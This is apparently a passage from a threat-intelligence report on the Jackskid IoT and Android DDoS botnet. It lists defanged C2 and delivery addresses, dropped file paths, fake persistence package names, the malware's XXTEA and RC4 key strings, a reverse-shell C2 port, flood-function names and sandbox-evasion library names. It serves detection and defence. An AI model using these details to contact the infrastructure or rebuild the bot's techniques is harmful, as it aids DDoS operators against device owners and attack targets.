| Mar 23 (lite scanner) | SHA-256: `f0e1cf0931162529d8ae1ede1e260824d58a04ae0a8bd44cb226c68eab91bc90` (x86-64) `cd3fd91053a5815252b5a6097e2abeb01af70b48e8e159438cc2a6611f66a6f8` (MIPS) `1a6f324487b89aaff2e54ef8247fa38b72708102c2c5cd14c2d83a4e58d818bd` (ARM) `77f0469ede50251f686e0e3ad993d1da833d4a41f4ef1df783bfa30451d52509` (ARM) |

### Network indicators

| **Type** | **Value** | **Context** |
|---|---|---|
| IP | `176.65.144[.]253` | C2 (hardcoded in 11c0447f, AS58271 Crimea) |
| IP | `5.187.35[.]158` | Dropper (port 1337, campaign `rhombus`) |
| IP | `130.12.180[.]126` | Dropper (port 1223, from 38e49e9f config) |
| IP | `158.94.210[.]88` | C2 (leaked from debug build 214d25ce) |
| Domain | `www.boatdealers[.]su` | C2 |
| Domain | `www.gokart[.]su` | C2 |
| Domain | `kieranellison.cecilioc2[.]xyz` | C2 |
| Domain | `nineeleven.gokart[.]su` | C2 |
| Domain | `www.sendtuna[.]com` | C2 |
| Domain | `ida.boatdealers[.]su` | C2 |
| Domain | `mail.gokart[.]su` | C2 |
| Domain | `moo.6yd[.]ru` | C2 (dynamic DNS) |
| Domain | `dvrip.6yd[.]ru` | C2 (dynamic DNS) |
| Domain | `log.6yd[.]ru` | C2 (dynamic DNS) |
| Domain | `nodes.ipmoyu[.]xyz` | C2 (Mar 11–15+; ~50 A records, fast-flux) |
| Domain | `peer.ipmoyu[.]xyz` | C2 (Mar 9; ~40 A records, fast-flux) |
| Domain | `www.ipmoyu[.]xyz` | C2 (late Feb; 14 A records, overlaps delivery range 203.188.174[.]x) |
| Domain | `www.plane[.]cat` | C2 (Jan 2026; config slot 4; same IP pool as boatdealers/gokart) |
| Domain | `www.jacob-butler[.]gay` | C2 (Mar 2026; same fast-flux pool as boatdealers/ipmoyu) |
| Domain | `www.richylam[.]org` | C2 (Mar 2026; matches `richylam` campaign tag; same fast-flux pool) |
| IP | `5.187.35[.]158` | Delivery (Jan–Feb; ports 1337,443,8473,8090,2441,2448,15,18) |
| IP | `5.187.35[.]166` | Delivery (Feb–Mar; ports 443,8473,48384,1003,3923) |
| IP | `5.187.35[.]167` | Delivery: komaru stager (:2450), richy (:3924), APK (:1004) |
| IP | `5.187.35[.]133` | Delivery (Mar 16; richy v2 + updated APK) |
| IP | `192.206.117[.]19` | Delivery (Feb 17; ports 443,2222,8081,8082,8443; SELinux bypass) |
| IP | `160.22.79[.]29` | Delivery (Feb 17; ports 443,6767,8443; cross-IP with 192.206.117.19) |
| IP | `147.182.169[.]126` | Delivery (Feb 27; ports 443,3389,8443; campaign `kieran`) |
| IP | `203.188.174[.]195` | Delivery (Feb 27 – Mar; ports 3923,9248,48384; overlaps ipmoyu.xyz DNS) |
| IP | `203.188.174[.]236`–`.242` | Delivery (Mar; port 48384; same stager as .195) |
| IP | `157.230.52[.]185` | Delivery (Mar 9; ports 11111,33811) |
| IP | `192.241.128[.]57` | Delivery (Mar 1; ports 443,8443) |
| IP | `206.81.9[.]186` | Delivery (Mar 11; ports 3923,3924,11111,33811; campaign `litecoin`) |
| IP | `103.77.175[.]243` | Delivery (Mar; ports 34567,21874; honeypot-confirmed live infection) |
| IP | `141.98.11[.]123` | Delivery (Mar 15; port 21874; latest richy) |
| IP | `185.16.39[.]146` | Reverse shell C2 (:456, ADB attack vector) |
| IP | `87.121.84[.]74` | com.system.update APK delivery (:13121, shared infra) |
| IP | `185.196.41[.]180` | C2 (23 crossover builds, Mar 2026 wave; shared with Aisuru 7500925a) |
| IP | `158.94.210[.]71` | C2 (5 stripped builds, Mar 2026 wave; same /24 as 158.94.210[.]88) |
| Domain | `ricocaseagainst.rebirth[.]st` | C2 (stripped builds, resolves to 158.94.210[.]71; Rebirth stresser) |
| Domain | `m3rnbvs5d.eth` | C2 (ENS; text record key `k1er4n`; post-disruption pivot) |
| IP | `194.87.198[.]208` | C2 (ENS-decoded; live on :17384; same /24 as ipmoyu fast-flux pool) |
| IP | `194.87.198[.]104` | C2 (ENS-decoded; live on :17384) |
| IP | `194.58.38[.]79` | C2 (ENS-decoded; live on :17384) |
| IP | `194.58.38[.]49` | C2 (ENS-decoded; live on :17384) |
| IP | `194.58.38[.]96` | C2 (ENS-decoded; live on :17384) |
| IP | `176.65.139[.]72` | Delivery: ENS build ELF (:3924), APK (:1004), installer (:8083); pfcloud.io AS51396 |
| IP | `77.90.63[.]58` | C2 (DNS, nodes.ipmoyu[.]xyz; live Mar 24; AS215365 threatoff.eu, DE) |
| IP | `77.90.63[.]61` | C2 (DNS, nodes.ipmoyu[.]xyz; live Mar 24; AS215365 threatoff.eu, DE) |
| IP | `77.90.63[.]62` | C2 (DNS, nodes.ipmoyu[.]xyz; live Mar 24; AS215365 threatoff.eu, DE) |
| Domain | `step1.flowlayer[.]app` | Proxy-host header for ADB delivery (resolves to loopback; 8/10 honeypot captures) |

### Host indicators

| **Path** | **Purpose** |
|---|---|
| `/data/local/tmp/daemon` | Dropped payload |
| `/data/local/tmp/instd` | Alternate dropper name |
| `/data/local/tmp/arm7` | Payload name in dd-pattern stager (honeypot, Mar 2026) |
| `/var/Sofia` | Persistence/config |
| `/tmp/tmpfs` | Staging |
| `/.ri` | Marker file |
| `/data/local/tmp/komaru` | ADB dropper stager (c654028d) |
| `/data/local/tmp/richy` | ADB dropper bot binary (c654028d) |
| `/data/local/tmp/me.apk` | ADB dropper APK (c654028d) |
| ADB port 22337 | Reconfigured ADB port (anti-competition, c654028d) |

### Android package indicators

| **Package** | **Role** | **First seen** |
|---|---|---|
| `com.example.bootsync` | Jackskid persistence (early) | Feb 17 |
| `com.example.googledev` | Jackskid persistence | Feb 17 |
| `com.google.android.gms.update` | Jackskid persistence | Feb 19 |
| `com.google.android.pms.update` | Jackskid persistence | Feb 22 |
| `com.google.android.sys.update` | Jackskid persistence | Mar 1 |
| `com.google.android.adm.update` | Jackskid persistence | Mar 2 |
| `com.google.android.env.update` | Jackskid persistence | Mar 2 |
| `com.google.alarm` | Jackskid persistence | Mar |
| `com.google.play` | Jackskid persistence | Mar 9 |
| `com.google.android.play` | Jackskid persistence (ENS C2 era) | Mar 23 |
| `com.android.docks` | Competitor: Snow | Removed by stager |
| `com.oreo.mcflurry` | Competitor: Lorikazz | Removed by stager |
| `com.telnetd.telenet` | Competitor | Removed by stager |
| `com.example.jewboot` | Competitor | Removed by stager |
| `com.google.android.update` | Old Jackskid (self-cleanup) | Removed by stager |

### Signature strings

| **String** | **Purpose** |
|---|---|
| `FrshPckBnnnSplit` | XXTEA key exchange passphrase (pure Jackskid builds) |
| `PJbiNbbeasddDfsc` | XXTEA key exchange passphrase (Aisuru–Jackskid crossover builds); XOR auth key (debug build 214d25ce) |
| `npxXoudifFeEgGaACScs` | Legacy Persirai/Torii format string |
| `DoH-Client/1.0` | DoH User-Agent |
| `TSource Engine Query` | A2S_INFO attack template |
| `DEADBEEF CAFEBABE E0A4CBD6 BADC0DE5` | RC4 config key (as uint32 LE) |
| `jilcore.6.so\|jipplib.1.so\|jibdata.2.so\|jiblib.5.so` | Bot self-ID / competition kill list (ENS + Mar builds) |
| `m3rnbvs5d.eth` | ENS C2 domain (post-disruption) |
| `k1er4n` | ENS text record key (leetspeak "kieran") |

### Ports of interest

| **Port** | **Use** |
|---|---|
| 23, 2323 | Telnet scanner/listener |
| 443, 8443 | Payload delivery (HTTPS) |
| 1337 | C2/dropper distribution |
| 1003, 1004 | APK delivery |
| 1223 | Alternate dropper |
| 2222, 2441, 2448 | Payload delivery |
| 3389 | Payload delivery (campaign `kieran`) |
| 3923, 3924 | Payload delivery (richy binary, stager) |
| 5555 | ADB (blocked by bot) |
| 3222, 12108 | Blocked (competitor botnet) |
| 2625 | Blocked (competitor botnet) |
| 6767, 8081, 8082 | Payload delivery (early stagers) |
| 8090, 8473 | Payload delivery (8090: debug build) |
| 9248 | Payload delivery |
| 11111 | APK delivery |
| 21874 | Payload delivery (Mar 2026) |
| 25565 | Minecraft login flood target |
| 30120 | FiveM flood target |
| 33811 | Stager script delivery |
| 34567 | Payload delivery (honeypot-confirmed) |
| 48384 | Payload delivery (most common stager port) |
| 456 | Reverse shell C2 |
| 524 | NCP template flood target |
| 22337 | Reconfigured ADB port (anti-competition) |

## C2 IP address table

The following 98 unique IP addresses were resolved from the 6 active C2 domains on 2026-03-07 using a diverse set of 15 public DNS resolvers. All IP addresses were enriched with ASN and geolocation data from the IPinfo dataset. Domain abbreviations: **boat** = boatdealers[.]su, **gokart** = gokart[.]su, **cecilio** = cecilioc2[.]xyz, **tuna** = sendtuna[.]com, **moo/dvrip/log** = 6yd[.]ru subdomains.

> **Post-disruption update:** Following the [March 19 law enforcement action](https://www.justice.gov/usao-ak/pr/authorities-disrupt-worlds-largest-iot-ddos-botnets-responsible-record-breaking-attacks), multiple C2 domains have gone NXDOMAIN and the majority of fast-flux endpoints no longer accept connections. The table below reflects the pre-disruption March 7 resolution snapshot; see [C2 infrastructure status](#c2-infrastructure-status-post-disruption) for current status.

| **IP** | **CC** | **ASN** | **AS name** | **Domains** |
|---|---|---|---|---|
| `38.54.110[.]251` | US | AS138915 | Kaopu Cloud HK Limited | boat; gokart |
| `38.54.42[.]181` | BD | AS138915 | Kaopu Cloud HK Limited | boat; gokart |
| `38.60.179[.]89` | ID | AS138915 | Kaopu Cloud HK Limited | log |
| `38.60.190[.]213` | IQ | AS138915 | Kaopu Cloud HK Limited | boat; gokart |
| `38.60.242[.]165` | BR | AS138915 | Kaopu Cloud HK Limited | boat; gokart |
| `104.248.216[.]121` | US | AS14061 | DigitalOcean, LLC | boat; gokart |
| `129.212.236[.]192` | SG | AS14061 | DigitalOcean, LLC | boat; gokart; tuna |
| `137.184.30[.]222` | US | AS14061 | DigitalOcean, LLC | boat; gokart; tuna |
| `144.126.192[.]140` | GB | AS14061 | DigitalOcean, LLC | boat; gokart; tuna |
| `146.190.105[.]241` | SG | AS14061 | DigitalOcean, LLC | boat; gokart |
| `159.89.118[.]149` | CA | AS14061 | DigitalOcean, LLC | boat; gokart |
| `165.22.235[.]17` | CA | AS14061 | DigitalOcean, LLC | boat; gokart; tuna |
| `167.99.67[.]81` | SG | AS14061 | DigitalOcean, LLC | cecilio |
| `170.64.175[.]58` | AU | AS14061 | DigitalOcean, LLC | boat; gokart; tuna |
| `188.166.65[.]85` | NL | AS14061 | DigitalOcean, LLC | boat; gokart; tuna |
| `192.241.154[.]204` | US | AS14061 | DigitalOcean, LLC | boat; gokart |
| `192.34.58[.]66` | US | AS14061 | DigitalOcean, LLC | cecilio |
| `206.189.129[.]44` | IN | AS14061 | DigitalOcean, LLC | boat; gokart; tuna |
| `206.189.69[.]59` | US | AS14061 | DigitalOcean, LLC | cecilio |
| `64.227.191[.]131` | IN | AS14061 | DigitalOcean, LLC | cecilio |
| `68.183.200[.]93` | CA | AS14061 | DigitalOcean, LLC | cecilio |
| `68.183.230[.]201` | SG | AS14061 | DigitalOcean, LLC | boat; gokart |
| `104.194.154[.]95` | SG | AS14956 | RouterHosting LLC | boat; gokart; tuna |
| `172.86.72[.]83` | US | AS14956 | RouterHosting LLC | boat; gokart; tuna |
| `172.86.76[.]168` | AE | AS14956 | RouterHosting LLC | boat; gokart; tuna |
| `216.126.236[.]27` | US | AS14956 | RouterHosting LLC | boat; gokart; tuna |
| `104.250.122[.]213` | SG | AS152900 | Onidel Pty Ltd | cecilio |
| `185.232.84[.]118` | NL | AS152900 | Onidel Pty Ltd | cecilio |
| `185.232.84[.]205` | NL | AS152900 | Onidel Pty Ltd | cecilio |
| `185.232.84[.]233` | NL | AS152900 | Onidel Pty Ltd | cecilio |
| `192.206.117[.]108` | SG | AS152900 | Onidel Pty Ltd | cecilio |
| `192.206.117[.]130` | SG | AS152900 | Onidel Pty Ltd | cecilio |
| `192.206.117[.]155` | SG | AS152900 | Onidel Pty Ltd | cecilio |
| `192.206.117[.]97` | SG | AS152900 | Onidel Pty Ltd | cecilio |
| `192.209.63[.]126` | US | AS152900 | Onidel Pty Ltd | boat; gokart |
| `192.209.63[.]140` | US | AS152900 | Onidel Pty Ltd | cecilio |
| `192.209.63[.]23` | US | AS152900 | Onidel Pty Ltd | cecilio |
| `192.209.63[.]242` | US | AS152900 | Onidel Pty Ltd | cecilio |
| `192.209.63[.]83` | US | AS152900 | Onidel Pty Ltd | cecilio |
| `184.174.96[.]216` | US | AS16276 | OVH SAS | boat; gokart; tuna |
| `51.161.204[.]237` | AU | AS16276 | OVH SAS | boat; gokart; tuna |
| `154.3.170[.]45` | US | AS174 | Cogent Communications | boat; gokart |
| `104.194.151[.]221` | GB | AS198983 | Joseph Hofmann | boat; gokart; tuna |
| `158.94.210[.]197` | NL | AS202412 | Omegatech LTD | cecilio |
| `5.61.209[.]96` | NL | AS206264 | Amarutu Technology Ltd | moo |
| `89.42.231[.]241` | NL | AS206264 | Amarutu Technology Ltd | moo |
| `89.42.231[.]254` | NL | AS206264 | Amarutu Technology Ltd | boat; gokart |
| `94.154.32[.]156` | TR | AS210538 | KEYUBU Internet | boat; gokart |
| `185.244.180[.]37` | RU | AS212441 | Cloud assets LLC | cecilio |
| `185.244.182[.]35` | RU | AS212441 | Cloud assets LLC | cecilio |
| `77.232.40[.]120` | RU | AS212441 | Cloud assets LLC | cecilio |
| `196.251.100[.]22` | DE | AS214967 | Optibounce, LLC | dvrip |
| `194.150.166[.]199` | GB | AS215311 | Regxa Company | boat; gokart |
| `206.206.76[.]20` | SG | AS215311 | Regxa Company | boat; gokart; tuna |
| `144.31.207[.]38` | NL | AS215439 | PLAY2GO INTL LIMITED | boat; gokart |
| `144.31.224[.]108` | NL | AS215439 | PLAY2GO INTL LIMITED | boat; gokart |
| `144.31.30[.]157` | NL | AS215439 | PLAY2GO INTL LIMITED | boat; gokart |
| `144.31.30[.]33` | NL | AS215439 | PLAY2GO INTL LIMITED | boat; gokart |
| `138.124.65[.]127` | LT | AS215540 | GLOBAL CONNECTIVITY SOLUTIONS | cecilio |
| `147.45.116[.]145` | BR | AS215540 | GLOBAL CONNECTIVITY SOLUTIONS | cecilio |
| `185.39.207[.]91` | GR | AS215540 | GLOBAL CONNECTIVITY SOLUTIONS | cecilio |
| `87.121.84[.]61` | NL | AS215925 | VPSVAULT.HOST LTD | boat; gokart; tuna |
| `87.121.84[.]62` | NL | AS215925 | VPSVAULT.HOST LTD | boat; gokart; tuna |
| `87.121.84[.]65` | NL | AS215925 | VPSVAULT.HOST LTD | boat; gokart; tuna |
| `103.136.150[.]208` | HK | AS26383 | Baxet Group Inc. | boat; gokart; tuna |
| `166.1.190[.]170` | US | AS26383 | Baxet Group Inc. | cecilio |
| `166.88.130[.]136` | CA | AS26383 | Baxet Group Inc. | boat; gokart; tuna |
| `166.88.164[.]151` | US | AS26383 | Baxet Group Inc. | boat; gokart |
| `167.17.188[.]20` | PL | AS26383 | Baxet Group Inc. | boat; gokart; tuna |
| `207.90.237[.]47` | US | AS26383 | Baxet Group Inc. | boat; gokart; tuna |
| `38.114.103[.]138` | US | AS26383 | Baxet Group Inc. | cecilio |
| `38.114.103[.]165` | US | AS26383 | Baxet Group Inc. | cecilio |
| `88.151.195[.]90` | UA | AS26383 | Baxet Group Inc. | boat; gokart; tuna |
| `91.149.218[.]180` | FR | AS26383 | Baxet Group Inc. | boat; gokart; tuna |
| `91.149.242[.]162` | ES | AS26383 | Baxet Group Inc. | cecilio |
| `185.225.68[.]179` | HU | AS30836 | 23VNet Kft. | boat; gokart |
| `193.233.207[.]95` | US | AS398343 | Baxet Group Inc. | boat; gokart |
| `155.103.71[.]239` | TR | AS44382 | Fiba Cloud Operation Company | tuna |
| `216.9.225[.]57` | US | AS44382 | Fiba Cloud Operation Company | tuna |
| `31.56.117[.]13` | LV | AS56971 | AS56971 Cloud | boat; gokart |
| `196.57.129[.]51` | US | AS58065 | Orion Network Limited | boat; gokart |
| `196.57.129[.]52` | US | AS58065 | Orion Network Limited | boat; gokart |
| `196.57.129[.]53` | US | AS58065 | Orion Network Limited | boat; gokart |
| `196.57.129[.]54` | US | AS58065 | Orion Network Limited | boat; gokart |
| `196.57.129[.]55` | US | AS58065 | Orion Network Limited | boat; gokart |
| `196.57.129[.]56` | US | AS58065 | Orion Network Limited | boat; gokart |
| `139.162.58[.]88` | SG | AS63949 | Akamai Connected Cloud | cecilio |
| `172.105.121[.]198` | SG | AS63949 | Akamai Connected Cloud | cecilio |
| `172.232.238[.]165` | ID | AS63949 | Akamai Connected Cloud | cecilio |
| `172.233.152[.]90` | US | AS63949 | Akamai Connected Cloud | cecilio |
| `172.233.19[.]208` | BR | AS63949 | Akamai Connected Cloud | cecilio |
| `172.233.28[.]157` | BR | AS63949 | Akamai Connected Cloud | cecilio |
| `172.233.96[.]205` | ES | AS63949 | Akamai Connected Cloud | cecilio |
| `172.235.194[.]38` | JP | AS63949 | Akamai Connected Cloud | cecilio |
| `172.238.12[.]236` | JP | AS63949 | Akamai Connected Cloud | cecilio |
| `172.239.28[.]237` | FR | AS63949 | Akamai Connected Cloud | cecilio |
| `31.56.228[.]189` | TR | — | — | boat; gokart |
| `45.39.190[.]179` | US | — | — | boat; gokart |

This single-day snapshot captured 98 unique IP addresses, but continuous DNS monitoring across both research teams observed **415+ unique fast-flux addresses** for the same domains over the January–March period — a 4× multiplier that underscores the pool's churn rate. The broader dataset adds hosting providers not visible in a single snapshot (BrainStorm Network, GHOSTnet, RoyaleHosting, Vultr), suggesting the operator rotates infrastructure rapidly enough that point-in-time DNS resolution captures only a quarter of the active pool.

The infrastructure is distributed across **25+ countries** and **30+ autonomous systems** — a geographic footprint that suggests the operator optimizes for jurisdictional complexity. The top hosting providers are:

| **AS** | **AS name** | **IP addresses** |
|---|---|---|
| AS14061 | DigitalOcean, LLC | 17 |
| AS152900 | Onidel Pty Ltd | 13 |
| AS26383 / AS398343 | Baxet Group Inc. | 12 |
| AS63949 | Akamai Connected Cloud | 10 |
| AS58065 | Orion Network Limited | 6 |
| AS138915 | Kaopu Cloud HK Limited | 5 |
| AS14956 | RouterHosting LLC | 4 |
| AS215439 | PLAY2GO INTL LIMITED | 4 |

**Top hosting providers in Jackskid fast-flux infrastructure**

Two distinct fast-flux pools are visible:
- **Pool A** (`boatdealers[.]su`, `gokart[.]su`, `sendtuna[.]com`): 54 IP addresses with heavy overlap. Dominated by DigitalOcean, Baxet Group, RouterHosting, Orion Network, and OVH.
- **Pool B** (`cecilioc2[.]xyz`): 38 IP addresses, mostly separate from Pool A. Dominated by Onidel Pty Ltd, Akamai Connected Cloud, Cloud assets LLC, and GLOBAL CONNECTIVITY SOLUTIONS.

The `6yd[.]ru` dynamic DNS entries (`moo`, `dvrip`, `log`) use dedicated single IP addresses on Amarutu Technology and Optibounce, suggesting a different tier of backup infrastructure.

## Debug build intelligence

Two debug builds provide complementary operator tradecraft insights:

**`214d25ce` (early Feb):** Leaked the C2 IP address `158.94.210[.]88` in cleartext, the XOR auth key `PJbiNbbeasddDfsc`, and internal function names:

| **Function name** | **Purpose** |
|---|---|
| `establish_connection` | C2 TCP connect |
| `teardown_connection` | C2 disconnect |
| `ensure_single_instance` | Port-based instance locking |
| `disable_oom` | OOM score manipulation |
| `send_data` | C2 data transmission |
| `hide_argv` | Process name masquerade |

**`e46cbe2a` (Feb 19):** A 160 KB unstripped DDoS-only build captured from port 8090 on `5.187.35[.]158`. Full symbol table with 300+ symbols reveals:

- **Project name:** `softbot` — binaries named `softbot.arm`, `softbot.mpsl`
- **Killer module:** `0clKiller` — `killer_exe`, `killer_maps`, `killer_stat`, `killer_mirai_exists`, `killer_mirai_init`, `killer_pid`, `report_kill`
- **Attack functions:** 16 named handlers — `attack_tcp_syn`, `attack_tcp_ack`, `attack_tcp_bypass`, `attack_tcp_handshake`, `attack_tcp_legit`, `attack_tcp_pshack`, `attack_tcp_stomp`, `attack_tcp_socket`, `attack_udp_bypass`, `attack_udp_generic`, `attack_udp_plain`, `attack_udp_raknet`, `attack_udp_rand`, `attack_udp_vse`, `attack_gre_eth`, `attack_gre_ip`
- **Config crypto:** `table_init`, `table_key`, `table_lock_val`, `table_retrieve_val`, `table_unlock_val`
- **C2:** `resolve_cnc_addr`, `resolve_func`, `ensure_single_instance`
- **PRNG:** `rand_init`, `rand_next`, `rand_next_range`, `rand_str`, `rand_alphastr`
- **Build environment:** aboriginal Linux cross-compiler (`/home/landley/aboriginal/aboriginal/build/simple-cross-compiler-armv7l`)

This build is DDoS-only — it has attack functions but no telnet scanner, no APK installer, and no C2 registration protocol. The operator ships different build configurations for different deployment contexts.

#### Sandbox fingerprint rotation

The encrypted config contains fake `.so` library names used to fingerprint sandbox environments. These rotate across builds:

| Period | Fingerprint libraries |
|--------|-----------------------|
| Feb 2026 | `jiwixlib.so`, `jinlib.so`, `jixylib.so`, `jiblib.so` |
| Mar 2026 | `jilcore.6.so`, `jipplib.1.so`, `jibdata.2.so`, `jiblib.5.so` |

The naming pattern (`ji*` prefix) is consistent enough to use as a detection signal, while the rotation demonstrates active anti-analysis maintenance — a changelog for libraries that don't exist.

